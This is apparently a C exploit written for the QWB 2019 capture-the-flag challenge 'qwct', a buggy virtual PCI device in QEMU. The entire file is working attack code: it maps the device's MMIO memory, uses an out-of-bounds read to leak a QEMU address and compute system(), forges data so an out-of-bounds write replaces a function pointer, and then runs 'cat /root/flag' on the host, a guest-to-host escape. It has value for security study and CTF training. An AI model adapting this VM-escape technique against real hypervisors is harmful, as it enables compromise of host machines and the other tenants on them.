/*
Author: raycp
File: exp.c
Description: exp for qwb 2019 qwct, out-of-bound during enc and dec algorithm.
Date: 2019-08-28
*/
#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include<sys/io.h>


unsigned char* mmio_mem;

void die(const char* msg)
{
    perror(msg);
    exit(-1);
}



void mmio_write(uint32_t addr, uint8_t value)
{
    *((uint8_t*)(mmio_mem + addr)) = value;
}

uint8_t mmio_read(uint32_t addr)
{
    return *((uint8_t*)(mmio_mem + addr));
}


void set_key(uint32_t offset, char c)
{
    mmio_write(0x1000+offset,c);
}

void set_input(uint32_t offset, char c)
{
    mmio_write(0x2000+offset,c);
}

void init_status()
{
    mmio_read(0);
}

void set_status_to_1()
{
    mmio_read(2);
}

void set_status_to_2()
{
    mmio_read(4);
}

void set_status_to_3()
{
    mmio_read(1);
}

void set_status_to_4()
{
    mmio_read(3);
}

void set_stream_enc()
{
    mmio_read(7);
}

void set_stream_dec()
{
    mmio_read(8);
}

void call_enc_thread()
{
    mmio_read(9);
}

void set_aes_enc()
{
    mmio_read(5);
}

void set_aes_dec()
{
    mmio_read(6);
}
void call_dec_thread()
{
    mmio_read(10);
}

uint8_t get_output(uint32_t offset)
{
    uint8_t result;
    result = mmio_read(0x3000+offset);
    if (result==0xff)
        result=0;
    return result;
}

uint64_t leak_qword(uint32_t offset)
{
    uint64_t leak_addr=0,tmp;
    uint32_t i;

    for (i=0; i<6; i++) {
        tmp=get_output(offset+i);
        tmp=tmp<<(i*8);
        leak_addr = leak_addr + tmp;
    }

    return leak_addr;
}



int main(int argc, char *argv[])
{
    
    // step 1 Open and map I/O memory for the strng device
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd == -1)
        die("mmio_fd open failed");

    mmio_mem = mmap(0, 0x100000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED)
        die("mmap mmio_mem failed");

    printf("mmio_mem @ %p\n", mmio_mem);

    // step 2 set input buff full with data with size of 0x800 
    init_status();
    set_status_to_1();

    int i;
    
    for (i=0; i<=0x7ff; i++) {
        set_input(i,'a');
    }

    set_status_to_2();
    set_status_to_3();

    for (i=0; i<=0x7ff; i++) {
        set_key(i, '\x01');
    }
    
    // step 3 call stream enc to full with output data
    set_status_to_4();
    set_stream_enc();
    set_stream_dec();

    call_enc_thread();
    sleep(1);

    //step 4 then we can leak enc pointer for strlen, out-of-bound read.
    uint64_t leak_pro_addr = leak_qword(0x800);
    uint64_t pro_base =  leak_pro_addr - 0x4D2A20;
    uint64_t system_addr = pro_base + 0x2ADF80;
    printf("leaking pro addr: 0x%lx\n", leak_pro_addr);
    printf("system plt addr: 0x%lx\n", system_addr);

    //step 5 start again, to get the output which crc will be the system pointer.
    init_status();
    set_status_to_1();
    
    for (i=0; i<=0x7ff-8; i++) {
        set_input(i,'a');
    }
    // the former 0x7f8 data crc will be 0x6161616161616161, so xor with system addr will get the wanted crc.
    for (i=0; i<8; i++) {
        set_input(0x7f8+i,((uint8_t*)&system_addr)[i]^'a');
    }

    set_status_to_2();
    set_status_to_3();
    for (i=0; i<0x10; i++) {
        set_key(i, '\x01');
    }

    set_status_to_4();
    set_aes_enc();

    call_enc_thread();
    sleep(1);
    //step 6 get the output which crc is system addr.
    uint8_t enc_data[2048];
    for(i=0; i<2048; i++) {
        enc_data[i] = get_output(i);
    }

    //step 7 use aes dec to overwrite enc pointer to system addr.
    init_status();
    set_status_to_1();

    for (i=0; i<0x800; i++){
        set_input(i, enc_data[i]);
    }

    set_status_to_2();
    set_status_to_3();

    for (i=0; i<0x10; i++) {
        set_key(i, '\x01');
    }

    set_status_to_4();
    set_aes_dec();
    // out-of-bound wirte to crc will overwrite the enc pointer to system addr.
    call_dec_thread();
    sleep(1);

    
    // step 8 set input buff to parameter and then trigger then enc to get the flag.
    init_status();
    set_status_to_1();
    char *para="cat /root/flag";
    for (i=0; i< strlen(para); i++){
        set_input(i, para[i]);
    }

    set_status_to_2();
    set_status_to_3();
    set_status_to_4();

    call_enc_thread();
    sleep(1);


}










